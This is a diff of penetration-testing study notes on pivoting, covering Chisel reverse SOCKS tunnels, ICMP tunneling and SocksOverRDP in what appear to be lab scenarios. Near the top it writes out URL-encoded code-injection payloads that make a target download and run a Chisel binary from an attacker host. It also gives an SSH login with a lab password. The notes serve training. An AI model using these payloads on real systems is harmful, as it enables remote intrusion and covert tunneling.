+curl http://192.168.227.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.231/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
+```
+
+In kali, start the chisel server:
+
+```bash
+chisel server --port 8080 --reverse
+```
+
+And now initiate the reverse tunnel: 
+
+```bash
+curl http://192.168.227.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.231:8080%20R:socks%27%29.start%28%29%22%29%7D/ 
+```
+
+Check status of the SOCKs proxy with:
+
+```bash
+ss -ntplu
+```
+
+And... now we can use the tunnel. For that, we'll use [_Ncat_](https://nmap.org/ncat/), the Netcat alternative written by the maintainers of Nmap. We can install this on Kali with **sudo apt install ncat**.
+
+```bash
+sudo apt install ncat
+```
+
+And now, establish access to the SSH server, through the Chisel reverse SOCKS proxy, tunneling traffic through a reverse HTTP tunnel.
+
+```bash
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.227.215
+# pass: sqlpass123
+```
+
+
+#### Scenario #2 from HTB
+For that, we will use the compromised machine (Ubuntu) as our Chisel server, listing on port 1234:
 
 | NIC | Attacker machine: kali | Compromised machine Ubuntu | Target: A webserver                                                                          |
 | --- | ---------------------- | -------------------------- | -------------------------------------------------------------------------------------------- |
@@ -1001,7 +1229,7 @@ proxychains xfreerdp /v:172.16.5.19 /u:$username /p:$password
 ```
 
 
-#### Chisel Reverse Pivot
+### Chisel Reverse Pivot
 
 In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.
 
@@ -1056,7 +1284,7 @@ proxychains xfreerdp /v:172.16.5.19 /u:$username /p:$password
 ```
 
 
-### ICMP tunneling with SOCKS 
+## ICMP tunneling with SOCKS 
 
 ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses.
 
@@ -1139,7 +1367,7 @@ proxychains xfreerdp  /u:$user /p:$password /v:172.16.5.19
 ```
 
 
-### RDP and SOCKS Tunneling with SocksOverRDP
+## RDP and SOCKS Tunneling with SocksOverRDP
 
 There are often times during an assessment when we may be limited to a Windows network and may not be able to use SSH for pivoting. We would have to use tools available for Windows operating systems in these cases. [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP) is an example of a tool that uses `Dynamic Virtual Channels` (`DVC`) from the Remote Desktop Service feature of Windows. DVC is responsible for tunneling packets over the RDP connection. Some examples of usage of this feature would be clipboard data transfer and audio sharing. However, this feature can also be used to tunnel arbitrary packets over the network. We can use `SocksOverRDP` to tunnel our custom packets and then proxy through it. We will use the tool [Proxifier](https://www.proxifier.com/) as our proxy server.
 
